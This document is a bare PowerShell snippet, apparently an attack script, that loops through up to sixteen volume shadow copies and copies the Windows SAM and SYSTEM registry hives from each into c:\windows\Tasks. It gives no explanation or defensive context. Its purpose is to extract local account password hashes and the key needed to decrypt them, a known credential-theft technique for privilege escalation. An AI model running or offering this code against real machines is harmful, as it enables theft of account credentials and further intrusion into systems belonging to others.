
for ($n = 1 ; $n -le 16 ; $n++){
[System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$n\Windows\System32\config\SAM", "c:\windows\Tasks\sam$n")
[System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$n\Windows\System32\config\SYSTEM", "c:\windows\Tasks\system$n")
}
